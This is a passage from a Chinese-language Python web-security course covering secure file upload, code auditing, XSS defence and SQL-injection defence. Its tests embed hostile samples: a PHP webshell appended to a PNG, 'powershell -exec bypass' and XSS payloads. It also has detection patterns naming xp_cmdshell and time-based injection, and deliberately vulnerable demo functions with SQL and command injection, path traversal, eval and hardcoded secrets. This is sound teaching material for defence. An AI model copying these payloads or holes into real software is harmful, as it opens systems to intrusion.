        if not self.validate_mime_type(file_content):
            return False, "文件MIME类型不允许", None
        
        # 6. 根据文件类型进行内容验证
        mime = magic.from_buffer(file_content, mime=True)
        
        if mime.startswith('image/'):
            valid, msg = self.validate_image_content(file_content)
            if not valid:
                return False, msg, None
        elif mime == 'application/pdf':
            valid, msg = self.validate_pdf_content(file_content)
            if not valid:
                return False, msg, None
        
        # 7. 恶意软件扫描
        valid, msg = self.scan_for_malware(file_content, original_filename)
        if not valid:
            return False, msg, None
        
        # 8. 生成安全文件名
        new_filename = self.generate_secure_filename(original_filename, file_content)
        
        # 9. 保存文件
        filepath = os.path.join(self.upload_dir, new_filename)
        
        # 写入文件
        with open(filepath, 'wb') as f:
            f.write(file_content)
        
        # 10. 生成文件信息
        file_info = {
            'original_name': original_filename,
            'secure_name': new_filename,
            'size': size,
            'mime_type': mime,
            'hash': hashlib.sha256(file_content).hexdigest(),
            'upload_time': __import__('time').time(),
            'metadata': metadata or {}
        }
        
        return True, filepath, file_info

class FileUploadAPI:
    """文件上传API服务"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.uploader = SecureFileUpload()
        self.upload_records = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>安全文件上传系统</h2>
            <form method="post" action="/upload" enctype="multipart/form-data">
                <input type="file" name="file" accept="image/*,.pdf,.txt"><br>
                <input type="text" name="description" placeholder="文件描述"><br>
                <input type="submit" value="上传">
            </form>
            <a href="/files">查看已上传文件</a>
            '''
        
        @self.app.route('/upload', methods=['POST'])
        def upload():
            file = request.files.get('file')
            description = request.form.get('description', '')
            
            success, result, info = self.uploader.process_upload(file, {'description': description})
            
            if success:
                self.upload_records.append(info)
                return jsonify({
                    'success': True,
                    'message': '上传成功',
                    'file': info
                })
            else:
                return jsonify({
                    'success': False,
                    'message': result
                }), 400
        
        @self.app.route('/files')
        def list_files():
            html = '<h2>已上传文件列表</h2><ul>'
            for record in self.upload_records:
                html += f'''
                <li>
                    {record['original_name']} 
                    ({record['size']} bytes) 
                    - {record['mime_type']}
                    <br>哈希: {record['hash'][:16]}...
                </li>
                '''
            html += '</ul><a href="/">返回</a>'
            return html
        
        @self.app.route('/download/<filename>')
        def download(filename):
            # 安全检查：只允许下载已记录的文件
            secure_names = [r['secure_name'] for r in self.upload_records]
            if filename not in secure_names:
                return "文件不存在", 404
            return send_from_directory(self.uploader.upload_dir, filename, as_attachment=True)
    
    def run(self, port=5006):
        self.app.run(debug=True, port=port)

class FileUploadSecurityChecker:
    """文件上传安全检测器"""
    
    @staticmethod
    def test_image_payload():
        """测试图片马检测"""
        # 创建测试图片马
        from PIL import Image
        import io
        
        img = Image.new('RGB', (100, 100), color='red')
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        
        # 在图片末尾添加PHP代码
        img_data = img_bytes.getvalue()
        malicious_code = b'<?php system($_GET["cmd"]); ?>'
        test_content = img_data + malicious_code
        
        return test_content
    
    @staticmethod
    def test_file_upload_vulnerabilities():
        """测试文件上传漏洞"""
        uploader = SecureFileUpload()
        
        print("="*50)
        print("文件上传安全检测")
        
        # 测试1：图片马检测
        print("\n测试1 - 图片马检测")
        img_malware = FileUploadSecurityChecker.test_image_payload()
        valid, msg = uploader.validate_image_content(img_malware[:100000])
        print(f"  图片验证结果: {valid}, {msg}")
        
        # 测试2：扩展名绕过
        print("\n测试2 - 扩展名绕过测试")
        test_cases = [
            ('shell.php', False),
            ('shell.php.jpg', False),
            ('shell.png', True),
            ('shell.PHP', False),
        ]
        for filename, expected in test_cases:
            result = uploader.validate_extension(filename)
            status = "✓" if result == expected else "✗"
            print(f"  {status} {filename}: {result} (预期: {expected})")
        
        # 测试3：恶意代码检测
        print("\n测试3 - 恶意代码检测")
        test_contents = [
            (b'<?php system("id"); ?>', 'PHP代码', False),
            (b'<script>alert(1)</script>', 'JavaScript', False),
            (b'This is normal text', '正常文本', True),
            (b'powershell -exec bypass', 'PowerShell', False),
        ]
        for content, name, expected in test_contents:
            valid, msg = uploader.scan_for_malware(content, 'test.txt')
            status = "✓" if valid == expected else "✗"
            print(f"  {status} {name}: {valid} (预期: {expected}) - {msg}")

def main():
    """主函数"""
    # 运行安全检测
    FileUploadSecurityChecker.test_file_upload_vulnerabilities()
    
    # 启动文件上传API
    print("\n" + "="*50)
    print("启动安全文件上传系统...")
    
    api = FileUploadAPI()
    
    import threading
    thread = threading.Thread(target=api.run, args=(5006,))
    thread.daemon = True
    thread.start()
    
    print("上传系统运行在 http://127.0.0.1:5006")
    print("\n文件上传安全最佳实践:")
    print("1. 使用白名单验证文件类型")
    print("2. 检测文件真实内容（MIME、魔数）")
    print("3. 图片文件重新编码，移除EXIF中的恶意代码")
    print("4. 使用随机文件名，避免路径遍历")
    print("5. 上传目录禁止执行脚本")
    print("6. 使用CDN或云存储，分离存储与执行")

if __name__ == "__main__":
    main()

讲解要点：
文件类型验证必须多层：扩展名+MIME+内容魔数
图片文件应重新编码或使用安全库验证
文件名必须随机化，避免路径遍历
上传目录必须禁止执行脚本
考虑使用云存储服务分离文件存储与执行环境

课后任务：实现一个支持多种文件类型的安全上传组件。



第8课：代码审计实战

前置知识：第5-7课
下一课衔接：第9课（应急响应基础）

知识点
静态代码审计方法论
常见漏洞模式识别
自动化审计工具
审计报告编写

代码练习8：自动化代码审计工具


"""
code_audit_tool.py
功能：Python代码安全审计工具
"""

import ast
import re
import os
import json
from pathlib import Path
from collections import defaultdict
import sys

class SecurityViolation:
    """安全违规信息"""
    
    SEVERITY_CRITICAL = "CRITICAL"
    SEVERITY_HIGH = "HIGH"
    SEVERITY_MEDIUM = "MEDIUM"
    SEVERITY_LOW = "LOW"
    
    def __init__(self, rule_id, severity, description, line_no, code_snippet):
        self.rule_id = rule_id
        self.severity = severity
        self.description = description
        self.line_no = line_no
        self.code_snippet = code_snippet
    
    def to_dict(self):
        return {
            'rule_id': self.rule_id,
            'severity': self.severity,
            'description': self.description,
            'line': self.line_no,
            'code': self.code_snippet.strip()
        }

class PythonCodeAuditor(ast.NodeVisitor):
    """Python代码审计器"""
    
    # SQL注入检测规则
    SQL_INJECTION_PATTERNS = [
        r'cursor\.execute\(f?["\'].*?\+.*?["\']',
        r'cursor\.execute\(["\'].*?%.*?["\']\s*%',
        r'execute\(f?["\'].*?\{.*?\}.*?["\']',
        r'raw\(f?["\'].*?\{.*?\}.*?["\']',
    ]
    
    # 命令注入检测规则
    COMMAND_INJECTION_PATTERNS = [
        r'os\.system\(.*?\+.*?\)',
        r'subprocess\.(call|Popen|run)\(.*?\+.*?\)',
        r'eval\(.*?\+.*?\)',
        r'exec\(.*?\+.*?\)',
        r'__import__\(.*?\+.*?\)',
    ]
    
    # 路径遍历检测规则
    PATH_TRAVERSAL_PATTERNS = [
        r'\.\./',
        r'\.\.\\',
        r'os\.path\.join\(.*?\.\.',
        r'open\(.*?\+.*?\)',
    ]
    
    # 硬编码凭证检测
    CREDENTIAL_PATTERNS = [
        (r'password\s*=\s*["\'][^\'"]+["\']', 'password'),
        (r'secret\s*=\s*["\'][^\'"]+["\']', 'secret'),
        (r'api_key\s*=\s*["\'][^\'"]+["\']', 'api_key'),
        (r'token\s*=\s*["\'][^\'"]+["\']', 'token'),
        (r'key\s*=\s*["\'][^\'"]{16,}["\']', 'key'),
    ]
    
    def __init__(self):
        self.violations = []
        self.current_file = ""
        self.current_lines = []
    
    def audit_file(self, filepath):
        """审计单个文件"""
        self.current_file = filepath
        self.violations = []
        
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                content = f.read()
                self.current_lines = content.split('\n')
            
            # 执行AST分析
            tree = ast.parse(content)
            self.visit(tree)
            
            # 执行正则模式匹配
            self.scan_patterns(content)
            
            return self.violations
        except SyntaxError as e:
            violation = SecurityViolation(
                "SYNTAX_ERROR", SecurityViolation.SEVERITY_MEDIUM,
                f"语法错误: {e}", e.lineno, self.current_lines[e.lineno-1] if e.lineno else ""
            )
            return [violation]
        except Exception as e:
            print(f"Error auditing {filepath}: {e}")
            return []
    
    def scan_patterns(self, content):
        """使用正则模式扫描"""
        # SQL注入扫描
        for pattern in self.SQL_INJECTION_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "SQLI-001", SecurityViolation.SEVERITY_CRITICAL,
                    "检测到SQL注入风险：使用了字符串拼接构建SQL查询",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 命令注入扫描
        for pattern in self.COMMAND_INJECTION_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "CMDI-001", SecurityViolation.SEVERITY_CRITICAL,
                    "检测到命令注入风险：使用了字符串拼接执行系统命令",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 路径遍历扫描
        for pattern in self.PATH_TRAVERSAL_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "PT-001", SecurityViolation.SEVERITY_HIGH,
                    "检测到路径遍历风险：用户输入可能被用于路径拼接",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
        
        # 硬编码凭证扫描
        for pattern, cred_type in self.CREDENTIAL_PATTERNS:
            for match in re.finditer(pattern, content, re.IGNORECASE):
                line_no = content[:match.start()].count('\n') + 1
                violation = SecurityViolation(
                    "HARDCODE-001", SecurityViolation.SEVERITY_HIGH,
                    f"检测到硬编码{cred_type}",
                    line_no, self.current_lines[line_no-1]
                )
                self.violations.append(violation)
    
    def visit_Call(self, node):
        """访问函数调用节点"""
        # 检测危险函数
        dangerous_funcs = ['eval', 'exec', 'compile', '__import__']
        
        if isinstance(node.func, ast.Name):
            func_name = node.func.id
            if func_name in dangerous_funcs:
                violation = SecurityViolation(
                    "DANGER-001", SecurityViolation.SEVERITY_CRITICAL,
                    f"使用了危险函数: {func_name}()",
                    node.lineno, self.current_lines[node.lineno-1]
                )
                self.violations.append(violation)
        
        self.generic_visit(node)
    
    def visit_Import(self, node):
        """访问导入节点"""
        # 检测危险模块导入
        dangerous_modules = ['pickle', 'marshal', 'socket', 'subprocess', 'os', 'sys']
        
        for alias in node.names:
            if alias.name.split('.')[0] in dangerous_modules:
                violation = SecurityViolation(
                    "IMPORT-001", SecurityViolation.SEVERITY_MEDIUM,
                    f"导入了可能危险的模块: {alias.name}",
                    node.lineno, self.current_lines[node.lineno-1]
                )
                self.violations.append(violation)
        
        self.generic_visit(node)
    
    def visit_Assign(self, node):
        """访问赋值节点"""
        # 检测敏感的变量名赋值
        sensitive_names = ['password', 'secret', 'token', 'api_key', 'key']
        
        for target in node.targets:
            if isinstance(target, ast.Name):
                var_name = target.id.lower()
                for sensitive in sensitive_names:
                    if sensitive in var_name:
                        # 检查是否从环境变量读取
                        if isinstance(node.value, ast.Call):
                            continue
                        
                        violation = SecurityViolation(
                            "SENSITIVE-001", SecurityViolation.SEVERITY_MEDIUM,
                            f"敏感变量 {target.id} 可能被硬编码",
                            node.lineno, self.current_lines[node.lineno-1]
                        )
                        self.violations.append(violation)
                        break
        
        self.generic_visit(node)

class WebAppAuditor:
    """Web应用安全审计器"""
    
    # Flask特有风险
    FLASK_RISK_PATTERNS = [
        (r'app\.secret_key\s*=\s*["\'][^\'"]{1,32}["\']', '弱密钥风险'),
        (r'debug\s*=\s*True', '调试模式开启'),
        (r'@app\.route.*methods=\[.*GET.*\]', 'GET方法敏感操作'),
        (r'jsonify\(.*request\.args', '潜在的JSON注入'),
    ]
    
    # Django特有风险
    DJANGO_RISK_PATTERNS = [
        (r'DEBUG\s*=\s*True', '调试模式开启'),
        (r'ALLOWED_HOSTS\s*=\s*\[\s*\]', '允许所有主机'),
        (r'@csrf_exempt', 'CSRF保护禁用'),
        (r'raw\(', '原始SQL查询'),
    ]
    
    @staticmethod
    def audit_web_app(framework='flask'):
        """审计Web应用"""
        patterns = WebAppAuditor.FLASK_RISK_PATTERNS if framework == 'flask' else WebAppAuditor.DJANGO_RISK_PATTERNS
        return patterns

class AuditReportGenerator:
    """审计报告生成器"""
    
    @staticmethod
    def generate_html_report(violations, output_file='audit_report.html'):
        """生成HTML报告"""
        # 按严重性分组
        grouped = defaultdict(list)
        for v in violations:
            grouped[v.severity].append(v)
        
        severity_order = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']
        
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>代码安全审计报告</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1 {{ color: #333; }}
                .summary {{ background: #f5f5f5; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
                .critical {{ background: #ffebee; border-left: 4px solid #f44336; padding: 10px; margin: 10px 0; }}
                .high {{ background: #fff3e0; border-left: 4px solid #ff9800; padding: 10px; margin: 10px 0; }}
                .medium {{ background: #e8f5e9; border-left: 4px solid #4caf50; padding: 10px; margin: 10px 0; }}
                .low {{ background: #e3f2fd; border-left: 4px solid #2196f3; padding: 10px; margin: 10px 0; }}
                .code {{ font-family: monospace; background: #eee; padding: 5px; margin: 5px 0; white-space: pre-wrap; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #4CAF50; color: white; }}
            </style>
        </head>
        <body>
            <h1>代码安全审计报告</h1>
            
            <div class="summary">
                <h2>审计摘要</h2>
                <p>总漏洞数: {len(violations)}</p>
        '''
        
        for severity in severity_order:
            count = len(grouped.get(severity, []))
            html += f'<p>{severity}: {count}</p>'
        
        html += '''
            </div>
            
            <h2>漏洞详情</h2>
        '''
        
        for severity in severity_order:
            for v in grouped.get(severity, []):
                html += f'''
                <div class="{severity.lower()}">
                    <strong>[{v.severity}] {v.rule_id}</strong>
                    <p>{v.description}</p>
                    <div class="code">第 {v.line_no} 行: {v.code_snippet}</div>
                </div>
                '''
        
        html += '''
        </body>
        </html>
        '''
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html)
        print(f"报告已生成: {output_file}")

class VulnerableCodeDemo:
    """存在安全问题的示例代码（用于审计测试）"""
    
    @staticmethod
    def vulnerable_sql():
        """不安全的SQL查询"""
        def get_user(user_id):
            import sqlite3
            conn = sqlite3.connect('db.sqlite')
            cursor = conn.cursor()
            # 漏洞：字符串拼接
            query = f"SELECT * FROM users WHERE id = {user_id}"
            cursor.execute(query)
            return cursor.fetchone()
        return get_user
    
    @staticmethod
    def vulnerable_command():
        """不安全的命令执行"""
        import os
        def ping(ip):
            # 漏洞：命令注入
            os.system(f"ping -c 4 {ip}")
        return ping
    
    @staticmethod
    def vulnerable_path():
        """不安全的文件读取"""
        import os
        def read_file(filename):
            # 漏洞：路径遍历
            with open(f"./uploads/{filename}", 'r') as f:
                return f.read()
        return read_file
    
    @staticmethod
    def vulnerable_code():
        """不安全代码示例文件"""
        code = '''
import sqlite3
import os
import subprocess

# SQL注入漏洞
def get_user(user_id):
    conn = sqlite3.connect('db.sqlite')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    return cursor.fetchone()

# 命令注入漏洞
def ping_host(ip):
    os.system(f"ping -c 4 {ip}")

# 硬编码密码
PASSWORD = "admin123"
API_KEY = "sk-1234567890abcdef"

# 路径遍历漏洞
def read_config(filename):
    with open(f"/app/config/{filename}", 'r') as f:
        return f.read()

# 危险函数使用
def eval_input(data):
    return eval(data)

# 调试模式
DEBUG = True
app.secret_key = "weak_secret"
'''
        return code

def run_audit_demo():
    """运行审计演示"""
    print("="*50)
    print("代码安全审计演示")
    
    # 创建临时审计文件
    temp_file = "temp_vulnerable_code.py"
    with open(temp_file, 'w') as f:
        f.write(VulnerableCodeDemo.vulnerable_code())
    
    # 执行审计
    auditor = PythonCodeAuditor()
    violations = auditor.audit_file(temp_file)
    
    print(f"\n发现 {len(violations)} 个安全问题:")
    for v in violations:
        print(f"\n[{v.severity}] {v.rule_id}")
        print(f"  行 {v.line_no}: {v.description}")
        print(f"  代码: {v.code_snippet[:80]}...")
    
    # 生成报告
    AuditReportGenerator.generate_html_report(violations, 'audit_demo_report.html')
    
    # 清理
    os.remove(temp_file)
    
    print("\n演示文件审计完成，报告已生成: audit_demo_report.html")

def main():
    """主函数"""
    run_audit_demo()
    
    # 演示Web应用审计
    print("\n" + "="*50)
    print("Web应用审计模式")
    
    flask_risks = WebAppAuditor.audit_web_app('flask')
    print("\nFlask常见安全风险:")
    for pattern, desc in flask_risks:
        print(f"  - {desc}: {pattern[:50]}...")

if __name__ == "__main__":
    main()

讲解要点：
代码审计分为静态分析（模式匹配）和动态分析（AST分析）
危险函数调用是重点关注对象
硬编码凭证是最常见的问题
审计报告应包含漏洞定位和修复建议

课后任务：对现有项目代码进行安全审计，编写审计报告。



Web安全与应急响应 Python实战课程体系（续）



第二周：Web安全防御与代码审计（第5-8课）

第5课：XSS防御与CSP实战

前置知识：第4课（XSS攻击）
下一课衔接：第6课（SQL注入防御）

知识点
HTML实体编码与上下文转义
Content Security Policy（CSP）详解
HttpOnly与Secure Cookie
XSS过滤器实现
富文本XSS防护

代码练习5：XSS防御系统


"""
xss_defense_system.py
功能：完整的XSS防御系统实现
"""

import re
import html
import hashlib
import json
from flask import Flask, request, make_response, render_template_string
from urllib.parse import urlparse

class XSSDefenseSystem:
    """XSS综合防御系统"""
    
    # 白名单标签（用于富文本）
    ALLOWED_TAGS = {
        'b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li',
        'a', 'img', 'div', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
    }
    
    # 白名单属性
    ALLOWED_ATTRIBUTES = {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'width', 'height'],
        'div': ['class', 'id'],
        'span': ['class', 'id']
    }
    
    # 危险协议黑名单
    DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:', 'file:']
    
    @staticmethod
    def html_escape_context(context, context_type='html'):
        """
        根据上下文进行转义
        context_type: html, attribute, javascript, css, url
        """
        if context_type == 'html':
            return html.escape(context)
        elif context_type == 'attribute':
            # HTML属性转义
            escaped = html.escape(context)
            # 额外处理引号
            escaped = escaped.replace('"', '&quot;').replace("'", '&#39;')
            return escaped
        elif context_type == 'javascript':
            # JavaScript字符串转义
            return json.dumps(context)[1:-1]
        elif context_type == 'css':
            # CSS转义
            return re.sub(r'[\\()]', lambda m: '\\' + m.group(0), context)
        elif context_type == 'url':
            from urllib.parse import quote
            return quote(context)
        return context
    
    @staticmethod
    def sanitize_rich_text(html_content):
        """
        清洗富文本内容（白名单模式）
        """
        from bs4 import BeautifulSoup, Comment
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # 删除注释
        for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
            comment.extract()
        
        # 遍历所有标签
        for tag in soup.find_all():
            if tag.name not in XSSDefenseSystem.ALLOWED_TAGS:
                tag.unwrap()  # 保留内容但删除标签
                continue
            
            # 清理属性
            allowed_attrs = XSSDefenseSystem.ALLOWED_ATTRIBUTES.get(tag.name, [])
            attrs_to_remove = []
            for attr in tag.attrs:
                if attr not in allowed_attrs:
                    attrs_to_remove.append(attr)
                else:
                    # 检查属性值是否包含危险协议
                    attr_value = tag.attrs[attr]
                    for proto in XSSDefenseSystem.DANGEROUS_PROTOCOLS:
                        if attr_value.lower().startswith(proto):
                            attrs_to_remove.append(attr)
                            break
            
            for attr in attrs_to_remove:
                del tag.attrs[attr]
        
        return str(soup)
    
    @staticmethod
    def generate_csp_header(policy_type='strict'):
        """
        生成CSP头
        policy_type: strict, moderate, permissive
        """
        if policy_type == 'strict':
            return {
                'Content-Security-Policy': "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
            }
        elif policy_type == 'moderate':
            return {
                'Content-Security-Policy': "default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'; img-src * data:;"
            }
        else:
            return {
                'Content-Security-Policy': "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'"
            }
    
    @staticmethod
    def generate_nonce():
        """生成CSP nonce"""
        import secrets
        return secrets.token_hex(16)
    
    @staticmethod
    def set_secure_cookie(response, name, value, **kwargs):
        """设置安全的Cookie"""
        response.set_cookie(
            name, value,
            httponly=True,
            secure=True,
            samesite='Strict',
            **kwargs
        )
        return response

class XSSDefenseMiddleware:
    """Flask XSS防御中间件"""
    
    def __init__(self, app):
        self.app = app
        self.setup_csp()
    
    def setup_csp(self):
        """设置CSP中间件"""
        @self.app.after_request
        def add_csp_headers(response):
            csp_headers = XSSDefenseSystem.generate_csp_header('strict')
            for key, value in csp_headers.items():
                response.headers[key] = value
            return response
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class XSSFilter:
    """XSS过滤器实现"""
    
    @staticmethod
    def filter_script_tags(content):
        """过滤script标签"""
        patterns = [
            r'<script[^>]*>.*?</script>',  # 完整script标签
            r'javascript:',                   # javascript协议
            r'on\w+\s*=',                    # 事件处理器
            r'<iframe[^>]*>',                # iframe标签
            r'<object[^>]*>',                # object标签
            r'<embed[^>]*>',                 # embed标签
            r'<form[^>]*>'                   # form标签（可能用于CSRF）
        ]
        for pattern in patterns:
            content = re.sub(pattern, '', content, flags=re.IGNORECASE | re.DOTALL)
        return content
    
    @staticmethod
    def filter_encoded_payload(content):
        """过滤编码后的Payload"""
        # 解码常见编码
        import urllib.parse
        decoded = urllib.parse.unquote(content)
        
        # 检测可疑模式
        suspicious = [
            '<script', '</script>', 'javascript:', 'onerror=', 'onload=',
            'onclick=', 'onmouseover=', 'alert(', 'confirm(', 'prompt(',
            'document.cookie', 'localStorage', 'sessionStorage'
        ]
        
        for pattern in suspicious:
            if pattern.lower() in decoded.lower():
                return False
        return True

class SecureCommentSystem:
    """安全的留言板系统（综合防御）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = hashlib.sha256(b'secure_secret_key').hexdigest()
        self.comments = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>安全留言板（XSS防御演示）</h2>
            <a href="/comment">发表留言</a> | <a href="/list">查看留言</a>
            '''
        
        @self.app.route('/comment', methods=['GET', 'POST'])
        def comment():
            if request.method == 'POST':
                name = request.form.get('name', '匿名')
                content = request.form.get('content', '')
                
                # 第1层防御：输入过滤
                if not XSSFilter.filter_encoded_payload(content):
                    return '内容包含可疑代码', 400
                
                # 第2层防御：清洗富文本
                safe_content = XSSDefenseSystem.sanitize_rich_text(content)
                safe_name = XSSDefenseSystem.html_escape_context(name, 'html')
                
                self.comments.append({
                    'name': safe_name,
                    'content': safe_content,
                    'timestamp': __import__('time').time()
                })
                return '留言成功！<a href="/list">查看留言</a>'
            
            return '''
            <h2>发表留言</h2>
            <form method="post">
                昵称: <input name="name"><br>
                内容: <textarea name="content" rows="5" cols="50"></textarea><br>
                <small>支持HTML标签: b, i, u, a, img等</small><br>
                <input type="submit" value="提交">
            </form>
            <a href="/">返回</a>
            '''
        
        @self.app.route('/list')
        def list_comments():
            html = '<h2>留言列表</h2>'
            for c in self.comments:
                html += f'''
                <div style="border:1px solid #ccc; margin:10px; padding:10px;">
                    <b>{c['name']}</b> ({__import__('datetime').datetime.fromtimestamp(c['timestamp'])}):<br>
                    <div>{c['content']}</div>
                </div>
                '''
            html += '<a href="/">返回</a>'
            
            response = make_response(html)
            # 添加CSP头
            csp_headers = XSSDefenseSystem.generate_csp_header('moderate')
            for k, v in csp_headers.items():
                response.headers[k] = v
            return response
    
    def run(self, port=5004):
        self.app.run(debug=True, port=port)

def test_xss_defense():
    """测试XSS防御效果"""
    defense = XSSDefenseSystem()
    
    print("="*50)
    print("XSS防御系统测试")
    
    # 测试1：HTML转义
    malicious = '<script>alert("XSS")</script>'
    print(f"\n测试1 - HTML转义")
    print(f"  输入: {malicious}")
    print(f"  转义后: {defense.html_escape_context(malicious, 'html')}")
    
    # 测试2：富文本清洗
    rich_content = '''
    <p>正常内容</p>
    <script>alert('evil')</script>
    <img src="x" onerror="alert(1)">
    <a href="javascript:alert('XSS')">恶意链接</a>
    <b>加粗文本</b>
    '''
    print(f"\n测试2 - 富文本清洗")
    print(f"  输入: {rich_content[:80]}...")
    sanitized = defense.sanitize_rich_text(rich_content)
    print(f"  清洗后: {sanitized[:80]}...")
    
    # 测试3：CSP头生成
    print(f"\n测试3 - CSP头")
    csp = defense.generate_csp_header('strict')
    print(f"  严格策略: {csp['Content-Security-Policy']}")
    
    # 测试4：Nonce生成
    nonce = defense.generate_nonce()
    print(f"\n测试4 - CSP Nonce")
    print(f"  生成的Nonce: {nonce}")
    
    # 测试5：XSS过滤器
    filter = XSSFilter()
    print(f"\n测试5 - XSS过滤器")
    test_payload = '<img src=x onerror=alert(1)>'
    is_safe = filter.filter_encoded_payload(test_payload)
    print(f"  Payload: {test_payload}")
    print(f"  检测结果: {'安全' if is_safe else '危险'}")

if __name__ == "__main__":
    test_xss_defense()
    
    # 启动安全留言板
    print("\n" + "="*50)
    print("启动安全留言板系统...")
    secure_board = SecureCommentSystem()
    
    import threading
    thread = threading.Thread(target=secure_board.run, args=(5004,))
    thread.daemon = True
    thread.start()
    
    print("安全留言板运行在 http://127.0.0.1:5004")
    print("演示XSS防御效果")

讲解要点：
输出转义是防御XSS的根本，必须根据上下文选择正确的转义方式
CSP作为深度防御机制，可阻止未知XSS的执行
富文本场景需使用白名单过滤而非黑名单
防御应多层：输入过滤+输出转义+CSP+HttpOnly Cookie

课后任务：实现一个支持Markdown的评论系统，确保不被XSS攻击。



第6课：SQL注入防御与参数化查询

前置知识：SQL注入基础
下一课衔接：第7课（文件上传防御）

知识点
参数化查询原理
ORM安全使用
存储过程安全
输入验证与白名单
WAF绕过与防御

代码练习6：SQL注入防御系统


"""
sql_defense_system.py
功能：SQL注入防御与参数化查询实现
"""

import re
import sqlite3
import hashlib
from contextlib import contextmanager
from flask import Flask, request, jsonify

class ParameterizedQuery:
    """参数化查询示例"""
    
    @staticmethod
    def sqlite_example():
        """SQLite参数化查询"""
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()
        
        # 创建表
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        
        # 插入数据 - 使用参数化查询
        users = [('alice', 'pass123'), ('bob', 'pass456'), ('admin', 'admin123')]
        cursor.executemany('INSERT INTO users (username, password) VALUES (?, ?)', users)
        conn.commit()
        
        # 安全查询 - 使用参数
        def safe_query(username):
            cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
            return cursor.fetchone()
        
        # 不安全查询 - 字符串拼接
        def unsafe_query(username):
            cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
            return cursor.fetchone()
        
        return safe_query, unsafe_query
    
    @staticmethod
    def mysql_example():
        """MySQL参数化查询（使用pymysql）"""
        try:
            import pymysql
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # 正确方式：使用参数元组
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False
    
    @staticmethod
    def postgresql_example():
        """PostgreSQL参数化查询（使用psycopg2）"""
        try:
            import psycopg2
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False

class SQLInjectionDetector:
    """SQL注入检测器"""
    
    # SQL注入特征模式
    SQL_PATTERNS = [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # 引号和注释
        r"(\%3D)|(=)|(\%3E)|(>)|(\%3C)|(<)",  # 比较运算符
        r"(\%20)|(\s)+(OR|AND)(\s)+(\d+|=)",  # OR/AND条件
        r"UNION(\s)+(ALL|SELECT|DISTINCT)",  # UNION注入
        r"SELECT(\s)+.*(\s)+FROM",  # SELECT注入
        r"INSERT(\s)+INTO",  # INSERT注入
        r"UPDATE(\s)+.*(\s)+SET",  # UPDATE注入
        r"DELETE(\s)+FROM",  # DELETE注入
        r"DROP(\s)+TABLE",  # DROP注入
        r"EXEC(\s)+.*(\s)+",  # 执行命令
        r"xp_cmdshell",  # SQL Server命令执行
        r"WAITFOR(\s)+DELAY",  # 时间盲注
        r"BENCHMARK\((\d)+,",  # MySQL基准测试
        r"DBMS_PIPE\.RECEIVE_MESSAGE",  # Oracle管道
        r"pg_sleep",  # PostgreSQL睡眠
    ]
    
    @classmethod
    def detect_injection(cls, user_input):
        """检测用户输入是否包含SQL注入特征"""
        if not user_input or not isinstance(user_input, str):
            return False
        
        for pattern in cls.SQL_PATTERNS:
            if re.search(pattern, user_input, re.IGNORECASE):
                return True
        return False
    
    @classmethod
    def sanitize_input(cls, user_input):
        """清理SQL注入特征"""
        if not user_input:
            return user_input
        
        # 转义特殊字符
        sanitized = user_input.replace("'", "''")
        sanitized = sanitized.replace("\\", "\\\\")
        
        # 移除SQL关键字（简单处理）
        sql_keywords = ['OR', 'AND', 'SELECT', 'UNION', 'INSERT', 'DELETE', 
                        'UPDATE', 'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE']
        for keyword in sql_keywords:
            sanitized = re.sub(rf'\b{keyword}\b', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized

class ORMSafetyChecker:
    """ORM安全使用检查器"""
    
    @staticmethod
    def sqlalchemy_safe():
        """SQLAlchemy安全用法"""
        # 安全：使用参数绑定
        # session.query(User).filter(User.username == username)
        
        # 危险：字符串拼接
